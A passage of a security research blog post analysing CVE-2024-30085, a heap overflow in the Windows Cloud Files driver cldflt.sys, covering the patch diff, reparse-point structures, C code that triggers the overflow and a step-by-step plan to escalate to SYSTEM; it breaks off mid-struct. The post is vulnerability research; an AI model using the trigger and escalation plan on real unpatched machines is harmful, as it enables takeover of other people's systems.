<!DOCTYPE html>
<html lang="en"><head>
    <title>Kernels and Cats</title>
    <meta content="text/html;charset=utf-8" http-equiv="Content-Type">
    <meta content="utf-8" http-equiv="encoding">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="format-detection" content="telephone=no" />
    <meta name="theme-color" content="#000084" />
    <meta name="google-site-verification" content="733C7I2uDZnatcput9zZupeQ_PX5Z0BJ1HmTnGi0SJI" />
    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
	<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
	<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
	<link rel="manifest" href="/site.webmanifest">
	<link rel="icon" href="https://kaligulaarmblessed.github.io//favicon.ico">
    <link rel="canonical" href="https://kaligulaarmblessed.github.io/">
    
    
</head>
<body>
<nav class="navbar navbar-inverse navbar-fixed-top">
    <div class="navbar-inner">
        <div class="container">
            <button type="button" class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse"></button>
            <a class="brand" href="https://kaligulaarmblessed.github.io/">Kernels and Cats</a>
            <div class="nav-collapse collapse">
                <ul class="nav">
                    
                    
                        
                            <li>
                                <a href="/about/">
                                    
                                    <span>About</span>
                                </a>
                            </li>
                        
                    
                        
                            <li>
                                <a href="/post/">
                                    
                                    <span>All posts</span>
                                </a>
                            </li>
                        
                    
                        
                            <li>
                                <a href="/challenges/">
                                    
                                    <span>CTF Challenges</span>
                                </a>
                            </li>
                        
                    
                        
                            <li>
                                <a href="/lab-compendium/">
                                    
                                    <span>Lab Compendium</span>
                                </a>
                            </li>
                        
                    
                        
                            <li>
                                <a href="/random-facts/">
                                    
                                    <span>Random Fun Facts</span>
                                </a>
                            </li>
                        
                    
                </ul>
            </div>
        </div>
    </div>
</nav><div id="content" class="container">

<div class="row-fluid navmargin">
    <div class="page-header">
        <h1>All I Want for Christmas is a CVE-2024-30085 Exploit - Tue, Dec 24, 2024</h1>
    </div>
    <p class="lead"></p>
    <h4 id="tldr">TLDR</h4>
<p>CVE-2024-30085 is a heap-based buffer overflow vulnerability affecting the Windows Cloud Files Mini Filter Driver <code>cldflt.sys</code>. By crafting a custom reparse point, it is possible to trigger the buffer overflow to corrupt an adjacent <code>_WNF_STATE_DATA</code> object. The corrupted <code>_WNF_STATE_DATA</code> object can be used to leak a kernel pointer from an ALPC handle table object. A second buffer overflow is then used to corrupt another <code>_WNF_STATE_DATA</code> object, which is then used to corrupt an adjacent <code>PipeAttribute</code> object. By forging a <code>PipeAttribute</code> object in userspace, we are able to leak the token address and override privileges to escalate privileges to NT AUTHORITY\SYSTEM. This blog post can also be found <a href="https://starlabs.sg/blog/2024/all-i-want-for-christmas-is-a-cve-2024-30085-exploit/">here</a> on the official STARLabs page.</p>
<h4 id="table-of-contents">Table of Contents</h4>
<ol>
<li><a href="#introduction-to-cldfltsys">Introduction to cldflt.sys</a></li>
<li><a href="#vulnerability-analysis-and-patch">Vulnerability Analysis and Patch</a></li>
<li><a href="#reparse-point-structure">Reparse Point Structure</a></li>
<li><a href="#triggering-the-vulnerability">Triggering the Vulnerability</a></li>
<li><a href="#exploitation-overview">Exploitation Overview</a></li>
<li><a href="#obtaining-a-kernel-pointer-leak">Obtaining a Kernel Pointer Leak</a></li>
<li><a href="#arbitrary-read">Arbitrary Read</a></li>
<li><a href="#privilege-escalation">Privilege Escalation</a></li>
<li><a href="#exploit-demo">Exploit Demo</a></li>
<li><a href="#acknowledgements">Acknowledgements</a></li>
<li><a href="#references">References</a></li>
</ol>
<h4 id="introduction-to-cldfltsys">Introduction to cldflt.sys</h4>
<p><code>cldflt.sys</code> is the Windows Cloud Files Mini Filter Driver, which allows users to manage and sync files between a remote server and a local client. <code>cldflt.sys</code> works by creating placeholder files and directories, which are implemented as reparse points. Placeholders allow the actual contents of a file to reside somewhere else and be retrieved (known as &ldquo;hydration&rdquo;) on demand, while looking and behaving like a normal file on the system. Placeholders can be created and managed by users via the Cloud Files API.</p>
<h4 id="vulnerability-analysis-and-patch">Vulnerability Analysis and Patch</h4>
<p><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30085">CVE-2024-30085</a> is a heap-based buffer overflow vulnerability discovered by Alex Birnberg from SSD Secure Disclosure, as well as Gwangun Jung and Junoh Lee from Theori. For Windows 10 22H2, this vulnerability was fixed in the <a href="https://support.microsoft.com/en-gb/topic/june-11-2024-kb5039211-os-builds-19044-4529-and-19045-4529-f7e528c9-5e9f-4cd8-9161-704708448517">KB5039211</a> update.</p>
<p><img src="/images/exploiting-cldflt/patch_diff.jpg" alt="Patch diff"></p>
<p>Looking at the patch diff, it is clear that the <code>HsmIBitmapNORMALOpen</code> function has been modified.</p>
<p><img src="/images/exploiting-cldflt/patch_diff2.jpg" alt="Patch diff HsmIBitmapNORMALOpen"></p>
<p>The vulnerable driver binary is displayed on the left, and the patched driver binary is on the right. From here, we can see that an additional code block <code>cmp r14d, 0x1000</code> has been added. Taking a look at part of the decompilation of the unpatched function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (local_70 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>) <span style="color:#f92672">||</span> (<span style="color:#ae81ff">0xffe</span> <span style="color:#f92672">&lt;</span> memcpy_size <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>    Dst <span style="color:#f92672">=</span> <span style="color:#a6e22e">ExAllocatePoolWithTag</span>(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0x1000</span>, <span style="color:#ae81ff">0x6d427348</span>); 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (Dst <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">HsmDbgBreakOnStatus</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">0x3fffff66</span>); 
</span></span><span style="display:flex;"><span>        ... <span style="color:#75715e">// Go to error path
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memcpy</span>(Dst, local_70, memcpy_size); 
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    iVar13 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)((memcpy_size <span style="color:#f92672">-</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">+</span> (longlong)local_70);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (iVar13 <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">&amp;&amp;</span> (memcpy_size <span style="color:#f92672">==</span> <span style="color:#ae81ff">4</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)(Dst <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>) <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)(Dst <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>) <span style="color:#f92672">|</span> <span style="color:#ae81ff">0x10</span>; 
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        Dst <span style="color:#f92672">=</span> <span style="color:#a6e22e">ExAllocatePoolWithTag</span>(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0x1000</span>, <span style="color:#ae81ff">0x6d427348</span>); <span style="color:#75715e">// Allocate a HsBm object
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> (Dst <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">HsmDbgBreakOnStatus</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">0x3fffff66</span>); 
</span></span><span style="display:flex;"><span>            ... <span style="color:#75715e">// Go to error path
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memcpy</span>(Dst, local_70, memcpy_size); <span style="color:#75715e">// Vulnerable memcpy, we control local_70 and memcpy_size!
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    ...
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The driver allocates a HsBm object of size 0x1000 in the paged pool, and copies data of <code>memcpy_size</code> to the allocated buffer. As the user is able to control the data copied, as well as the value of <code>memcpy_size</code>, if <code>memcpy_size</code> is greater than 0x1000, a heap-based buffer overflow in the paged pool will occur!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (((<span style="color:#66d9ef">int</span>)uVar7 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#ae81ff">0x1000</span> <span style="color:#f92672">&lt;</span> memcpy_size)) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">HsmDbgBreakOnStatus</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">0x3fff30fe</span>); 
</span></span><span style="display:flex;"><span>    ... <span style="color:#75715e">// Go to error path
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
</span></span></code></pre></div><p>To patch the vulnerability, a check to determine if <code>memcpy_size</code> is less than or equal to 0x1000 was added, and the memcpy would only be called if this check passes.</p>
<h4 id="reparse-point-structure">Reparse Point Structure</h4>
<p>However, in order to understand how to trigger this vulnerability, we must first understand the structure of the reparse points that the cldflt driver uses to store data.</p>
<p>A reparse point comprises of a reparse tag, which identifies the file system driver that owns the reparse point, and user-defined data. In this case, when we create the file used for exploitation, we will use <code>IO_REPARSE_TAG_CLOUD_6</code> (0x9000601a) as the reparse tag.</p>
<p>The user-defined data has the following structure:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _REPARSE_DATA_BUFFER {
</span></span><span style="display:flex;"><span>    ULONG  ReparseTag;
</span></span><span style="display:flex;"><span>    USHORT ReparseDataLength;
</span></span><span style="display:flex;"><span>    USHORT Reserved;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> {
</span></span><span style="display:flex;"><span>        UCHAR DataBuffer[<span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span>    } GenericReparseBuffer;
</span></span><span style="display:flex;"><span>} REPARSE_DATA_BUFFER, <span style="color:#f92672">*</span>PREPARSE_DATA_BUFFER;
</span></span></code></pre></div><p><code>DataBuffer</code> has a variable size, and contains custom data set by the cloud filter driver, which takes the following format:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> _HSM_REPARSE_DATA {
</span></span><span style="display:flex;"><span>    USHORT Flags;                       
</span></span><span style="display:flex;"><span>    USHORT Length;                      
</span></span><span style="display:flex;"><span>    HSM_DATA FileData;                  
</span></span><span style="display:flex;"><span>} HSM_REPARSE_DATA, <span style="color:#f92672">*</span>PHSM_REPARSE_DATA;
</span></span></code></pre></div><p>When <code>cldflt.sys</code> creates a reparse point, if the size of the data is greater than 0x100 bytes, it will compress the data using <code>RtlCompressBuffer</code> with <code>COMPRESSION_FORMAT_LZNT1</code>. <code>Flags</code> is set to 0x1 if no compression is involved, and 0x8001 if compression is used. <code>Length</code> refers to the size of the entire <code>_HSM_REPARSE_DATA</code> structure. <code>FileData</code> takes the following form:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _HSM_DATA
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    ULONG  Magic;                      
</span></span><span style="display:flex;"><span>    ULONG  Crc32;                      
</span></span><span style="display:flex;"><span>    ULONG  Length;                     
</span></span><span style="display:flex;"><span>    USHORT Flags;                       
</span></span><span style="display:flex;"><span>    USHORT NumberOfElements;            
</span></span><span style="display:flex;"><span>    HSM_ELEMENT_INFO ElementInfos[<span style="color:#ae81ff">1</span>];  
</span></span><span style="display:flex;"><span>} HSM_DATA, <span style="color:#f92672">*</span>PHSM_DATA;
</span></span></code></pre></div><p><code>Magic</code> is set to 0x70527442 (&ldquo;BtRp&rdquo;) for bitmap data, and 0x70526546 (&ldquo;FeRp&rdquo;) for file data. If the CRC32 exists, it will be included in the structure. The CRC32 is calculated using <code>RtlComputeCrc32</code>. <code>Length</code> refers to the size of the entire <code>_HSM_DATA</code> object. <code>Flags</code> will be set to 0x2 if a CRC32 checksum value exists. A <code>_HSM_DATA</code> struct can include a number of elements, which take the following form:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _HSM_ELEMENT_INFO
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    USHORT Type;                        
</span></span><span style="display:flex;"><span>    USHORT Length;                      
</span></span><span style="display:flex;"><span>    ULONG  Offset;                     
</span></span><span style="display:flex;"><span>} HSM_ELEMENT_INFO, <span style="color:#f92672">*</span>PHSM_ELEMENT_INFO;
</span></span></code></pre></div><p>Elements can have the following types:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">#define HSM_ELEMENT_TYPE_NONE           0x00
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define HSM_ELEMENT_TYPE_UINT64         0x06
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define HSM_ELEMENT_TYPE_BYTE           0x07
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define HSM_ELEMENT_TYPE_UINT32         0x0a
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define HSM_ELEMENT_TYPE_BITMAP         0x11
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define HSM_ELEMENT_TYPE_MAX            0x12
</span></span></span></code></pre></div><p><code>Length</code> refers to the size of the element data, and <code>offset</code> is relative to the start of the <code>_HSM_DATA</code> struct.</p>
<h4 id="triggering-the-vulnerability">Triggering the Vulnerability</h4>
<p>Let&rsquo;s take a look at the code path required to trigger the vulnerability:</p>
<pre tabindex="0"><code>-&gt; HsmFltPostCREATE
    -&gt; HsmiFltPostECPCREATE
        -&gt; HsmpSetupContexts
            -&gt; HsmpCtxCreateStreamContext
                -&gt; HsmIBitmapNORMALOpen
</code></pre><p>By opening a file containing cldflt reparse data, we are able to reach <code>HsmpCtxCreateStreamContext</code>. However, in order to reach <code>HsmIBitmapNORMALOpen</code> to trigger the vulnerable <code>memcpy</code>, there are certain checks that we have to pass relating to both the FeRp object as well as its nested BtRp object.</p>
<p>When <code>HsmpCtxCreateStreamContext</code> is reached, it will call <code>HsmpRpValidateBuffer</code>, which will perform checks on the reparse data. It first checks the length and magic of the <code>_HSM_DATA</code> object, before computing its CRC32. The number of elements is then checked to ensure that it is less than 0xa, which is the maximum number of elements for an FeRp object. Once initial checks have passed, the function loops over all the elements to ensure that the sum of the element offset and length does not exceed the length of the data object.</p>
<p>After that is complete, checks are performed on each of the elements, and usually comprise of the following:</p>
<ol>
<li>Check that the element type is within the range of allowed types (i.e. less than <code>HSM_ELEMENT_TYPE_MAX</code>, which is 0x12)</li>
<li>Check the element offset</li>
<li>Check the element size</li>
</ol>
<p>In this case, the elements of an FeRp object must fulfil the following criteria:</p>
<ul>
<li>Element 0 must be of type BYTE (0x07)</li>
<li>Element 1 must be of type UINT32 (0x0a)</li>
<li>Element 2 must be of type UINT64 (0x06)</li>
<li>Element 4 must be of type BITMAP (0x11)</li>
</ul>
<p><code>HsmpBitmapIsReparseBufferSupported</code> is then called to perform checks on the nested BtRp object. Initial checks similar to those for the FeRp object are performed, sans the CRC32 calculation. The maximum number of elements allowed for a BtRp object is 0x5. The elements must fulfil the following criteria:</p>
<ul>
<li>Element 0 must be of type BYTE (0x07)</li>
<li>Element 1 must be of type BYTE (0x07)</li>
<li>Element 2 must be of type BYTE (0x07)</li>
</ul>
<p>Once <code>HsmpBitmapIsReparseBufferSupported</code> is done, it returns back to <code>HsmpRpValidateBuffer</code>, which returns to <code>HsmpCtxCreateStreamContext</code>, which finally calls <code>HsmIBitmapNORMALOpen</code>. <code>HsmIBitmapNORMALOpen</code> also implements checks on the elements of the BtRp object:</p>
<ul>
<li>Element 1 must be of type BYTE (0x07), and must have a value of 0x1</li>
<li>Element 2 must be of type BYTE (0x07)</li>
<li>Element 3 must be of type UINT64 (0x06)</li>
<li>Element 4 must be of type BITMAP (0x11)</li>
</ul>
<p>Once all these conditions are fulfilled, we will finally reach the vulnerable memcpy!</p>
<p>In order to trigger the vulnerability, we will first have to use the Cloud Filter API to register a sync root:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    CF_SYNC_REGISTRATION CfSyncRegistration <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
</span></span><span style="display:flex;"><span>    CfSyncRegistration.StructSize <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(CF_SYNC_REGISTRATION);
</span></span><span style="display:flex;"><span>    CfSyncRegistration.ProviderName <span style="color:#f92672">=</span> <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;FFE4&#34;</span>;
</span></span><span style="display:flex;"><span>    CfSyncRegistration.ProviderVersion <span style="color:#f92672">=</span> <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;1.0&#34;</span>;
</span></span><span style="display:flex;"><span>    CfSyncRegistration.ProviderId <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0xf4d808a4</span>, <span style="color:#ae81ff">0xa493</span>, <span style="color:#ae81ff">0x4703</span>, { <span style="color:#ae81ff">0xa8</span>, <span style="color:#ae81ff">0xb8</span>, <span style="color:#ae81ff">0xe2</span>, <span style="color:#ae81ff">0x6a</span>, <span style="color:#ae81ff">0x7</span>, <span style="color:#ae81ff">0x7a</span>, <span style="color:#ae81ff">0xd7</span>, <span style="color:#ae81ff">0x3b</span> } };
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    CF_SYNC_POLICIES CfSyncPolicies <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
</span></span><span style="display:flex;"><span>    CfSyncPolicies.StructSize <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(CF_SYNC_POLICIES);
</span></span><span style="display:flex;"><span>    CfSyncPolicies.HardLink <span style="color:#f92672">=</span> CF_HARDLINK_POLICY_ALLOWED;
</span></span><span style="display:flex;"><span>    CfSyncPolicies.Hydration.Primary <span style="color:#f92672">=</span> CF_HYDRATION_POLICY_FULL;
</span></span><span style="display:flex;"><span>    CfSyncPolicies.InSync <span style="color:#f92672">=</span> CF_INSYNC_POLICY_NONE;
</span></span><span style="display:flex;"><span>    CfSyncPolicies.Population.Primary <span style="color:#f92672">=</span> CF_POPULATION_POLICY_PARTIAL;
</span></span><span style="display:flex;"><span>    CfSyncPolicies.PlaceholderManagement <span style="color:#f92672">=</span> CF_PLACEHOLDER_MANAGEMENT_POLICY_UPDATE_UNRESTRICTED;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    hRet <span style="color:#f92672">=</span> <span style="color:#a6e22e">CfRegisterSyncRoot</span>(SyncRoot, <span style="color:#f92672">&amp;</span>CfSyncRegistration, <span style="color:#f92672">&amp;</span>CfSyncPolicies, CF_REGISTER_FLAG_DISABLE_ON_DEMAND_POPULATION_ON_ROOT);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">SUCCEEDED</span>(hRet)) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">CfUnregisterSyncRoot</span>(SyncRoot);
</span></span><span style="display:flex;"><span>        cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;CfRegisterSyncRoot failed! error=&#34;</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#a6e22e">GetLastError</span>() <span style="color:#f92672">&lt;&lt;</span> endl;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] CfRegisterSyncRoot success: 0x%lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, hRet);
</span></span></code></pre></div><p>We will then create our file in the sync root directory:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    HANDLE hFile1;
</span></span><span style="display:flex;"><span>    CString FullFileName1 <span style="color:#f92672">=</span> <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;c:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">windows</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">temp</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">test&#34;</span>;
</span></span><span style="display:flex;"><span>    hFile1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateFile</span>(FullFileName1, GENERIC_ALL, FILE_SHARE_READ <span style="color:#f92672">|</span> FILE_SHARE_WRITE <span style="color:#f92672">|</span> FILE_SHARE_DELETE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (hFile1 <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE) {
</span></span><span style="display:flex;"><span>        cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;Open file failed! error=&#34;</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#a6e22e">GetLastError</span>() <span style="color:#f92672">&lt;&lt;</span> endl;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Created exploit file 1: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, hFile1);
</span></span></code></pre></div><p>Finally, we will set the reparse point data using <code>FSCTL_SET_REPARSE_POINT_EX</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    hBool <span style="color:#f92672">=</span> <span style="color:#a6e22e">DeviceIoControl</span>(hFile, FSCTL_SET_REPARSE_POINT_EX, <span style="color:#f92672">&amp;</span>RpBufEx, (<span style="color:#ae81ff">0x28</span><span style="color:#f92672">+</span>CompressedRpBufSize), NULL, <span style="color:#ae81ff">0</span>, NULL, NULL);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (hBool <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>        cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;FSCTL_SET_REPARSE_POINT_EX failed! error=&#34;</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#a6e22e">GetLastError</span>() <span style="color:#f92672">&lt;&lt;</span> endl;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] FSCTL_SET_REPARSE_POINT_EX succeeded</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span></code></pre></div><p>To hit the vulnerable code path, all we need to do is to reopen the file:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Opening file 1 to trigger vulnerability</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    hFile1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    hFile1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateFile</span>(FullFileName1, GENERIC_ALL, FILE_SHARE_READ <span style="color:#f92672">|</span> FILE_SHARE_WRITE <span style="color:#f92672">|</span> FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (hFile1 <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE) {
</span></span><span style="display:flex;"><span>        cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;Open file failed! error=&#34;</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#a6e22e">GetLastError</span>() <span style="color:#f92672">&lt;&lt;</span> endl;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] File 1 handle: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, hFile1); 
</span></span></code></pre></div><p>Once the overflow occurs, the machine crashes!</p>
<p><img src="/images/exploiting-cldflt/crash.jpg" alt="Crash"></p>
<h4 id="exploitation-overview">Exploitation Overview</h4>
<p>Currently, we have an overflow in the paged pool, affecting an object of size 0x1000. In order to escalate privileges, we are going to require a kernel pointer leak, and the ability to do an arbitrary write. It is also possible to trigger this vulnerability multiple times, provided that we control the memory layout so that the machine does not crash. Hence, we are going to trigger this bug twice &ndash; once to obtain a kernel leak and gain an arbitrary write primitive, and a second time to gain arbitrary read which would give us the address of token.</p>
<p>Here is the exploit plan:</p>
<ol>
<li>Create exploit file 1 and set custom reparse point data of size 0x1010</li>
<li>Spray a padding _WNF_STATE_DATA spray</li>
<li>Spray the first set of _WNF_STATE_DATA objects</li>
<li>Poke holes by freeing every alternate _WNF_STATE_DATA object</li>
<li>Trigger the vulnerability for the first time to reclaim one of the holes &ndash; this corrupts the _WNF_STATE_DATA object, giving us out-of-bounds read and write</li>
<li>Spray ALPC handle tables to reclaim the rest of the holes</li>
<li>Leak a kernel pointer via reading from the first corrupted _WNF_STATE_DATA object</li>
<li>Create exploit file 2 and set custom reparse point data of size 0x1010</li>
<li>Spray second padding _WNF_STATE_DATA spray</li>
<li>Poke holes by freeing every alternate _WNF_STATE_DATA object</li>
<li>Trigger the vulnerability for the second time to reclaim one of the holes</li>
<li>Spray PipeAttribute to reclaim the rest of the holes</li>
<li>Use the second corrupted _WNF_STATE_DATA object to corrupt the PipeAttribute object to point to a fake object in userland &ndash; this gives us arbitrary read</li>
<li>Use the corrupted PipeAttribute object to obtain the address of token</li>
<li>Use the first corrupted _WNF_STATE_DATA object to corrupt the ALPC handle table to give us arbitrary write</li>
<li>Overwrite token privileges to get full privileges!</li>
<li>Obtain a handle to the winlogon process</li>
<li>Pop an NT AUTHORITY\SYSTEM shell!!!</li>
</ol>
<h4 id="obtaining-a-kernel-pointer-leak">Obtaining a Kernel Pointer Leak</h4>
<p>We will be obtaining a kernel pointer leak using two kernel objects: <code>_WNF_STATE_DATA</code> and <code>_ALPC_HANDLE_TABLE</code>.</p>
<p>Let&rsquo;s first take a look at <code>_WNF_STATE_DATA</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> _WNF_STATE_DATA {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> _WNF_NODE_HEADER Header;                                         <span style="color:#75715e">//0x0
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    ULONG AllocatedSize;                                                    <span style="color:#75715e">//0x4
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    ULONG DataSize;                                                         <span style="color:#75715e">//0x8
